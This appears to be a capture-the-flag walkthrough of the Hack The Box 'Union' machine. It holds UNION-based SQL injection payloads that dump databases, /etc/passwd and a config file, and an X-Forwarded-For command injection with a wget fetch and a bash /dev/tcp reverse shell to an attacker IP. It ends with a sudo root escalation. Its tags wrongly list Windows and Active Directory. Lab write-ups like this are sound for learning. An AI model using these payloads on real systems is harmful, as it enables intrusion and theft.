---
title: "Union Walkthrough(HTB)"
date: 2025-03-12
draft: true
description: "Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses."
tags: ["medium", "Windows", "HTB", "hacking", "Active Directory", "Walkthrough"]
series: ["Hack The Box"]
series_order: 5
---
## Reconnaissance & Enumeration Linux 
- nmap scan results 
```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
- Interesting isn't it, that we only got port 80 open
- From the session cookie we can learn that, It's running using PHP
- Fired up a subdomain scan and got no  results
- ![[Pasted image 20250113000957.png]]
- As this is a PHP ran web I fired up a directory fuzzing with extension `.php`
```
ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t 60
```
- Got some results
- ![[Pasted image 20250113001145.png]]
- Cannot access the `/firewall.php` page
- The website have a Username check option if the username valid or did not present on the database It will provide a link to `challenge.php` where have to submit some kind of flag
- This parameter seems to be vulnerable to #SQLi . When I provide this payload I am getting different error
```
'OR 1=1; -- -
```
- ![[Pasted image 20250113001954.png]]
- As firewall is running SQLMap not working so have to play manually
- Got a Interesting response for this payload
```
' UNION select user(); -- -
```
- ![[Pasted image 20250113002241.png]]

- Info about databases
```payload
' UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- -
```
- **Output:**
```
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```

- We got five databases but `november` seems more interesting
```
' UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november'; -- -
```
- **Output:**
```
Sorry, flag,players you are not eligible due to already qualifying.
```

- `november` database has two tables
```
' UNION select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='november'; -- -
```
- **Output:**
```
Sorry, flag:one,players:player you are not eligible due to already qualifying.
```

- Each had only one column so password column I guess. Going for `flag` table for now
```
' UNION select group_concat(one) from flag; -- -
```
- **Output:**
```
Sorry, <redacted> you are not eligible due to already qualifying.
```
- Got the flag and after submission of the flag to website firewalls lifted and port 22 is now accessible
- ![[Pasted image 20250113003834.png]]
- nmap scan result for port 22
```
❯ nmap -p 22 -A 10.10.11.128                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST
Nmap scan report for union.htb (10.10.11.128)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)

```

- Got the users info
```
' UNION select group_concat(player) from players; -- -
```
- **Output:**
```
Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying.
```
## Exploitation

- Got the `/etc/passwd` file data
```
' UNION select load_file('/etc/passwd'); -- -
```
- **Output:**
```
Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
 you are not eligible due to already qualifying.
```
- Found three valid users to access the system

- Can also read the source code of the page
```
' UNION select load_file('/var/www/html/index.php'); -- -
```
- As we found the `config.php` via the directory fuzzing let's try getting it
```
' UNION select load_file('/var/www/html/config.php'); -- -
```
- **Output:**
```
Sorry, <?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "<redacted>";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
 you are not eligible due to already qualifying.
```
- Accessed SSH and got the user flag
- ![[Pasted image 20250113005214.png]]
## Privilege Escalation
- Looked onto the `firewall.php` code
```
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```
- This above part is vulnerable to command Injection
- Tested with this header payload and it worked
```
X-FORWARDED-FOR: 8.8.8.8; wget http://10.10.14.4:8000/Union_AllPorts.txt;
```
- ![[Pasted image 20250113011912.png]]
- Got a shell with this 
```
X-FORWARDED-FOR: 8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/6001 <&1';
```
- Upgraded the shell to be more stable using new technique
```
script /dev/null -c bash
```
- Then foreground the shell with `CTRL+Z`
```
stty raw -echo; fg
```
- In the shell type this
```
reset
```
- Now the shell is upgraded
- Issued this command `sudo -l` and found that `sudo` can be run with anything
- ![[Pasted image 20250113012401.png]]
- So exploited it using 
```
sudo /bin/bash
```
- Got the root flag.
- ![[Pasted image 20250113012505.png]]
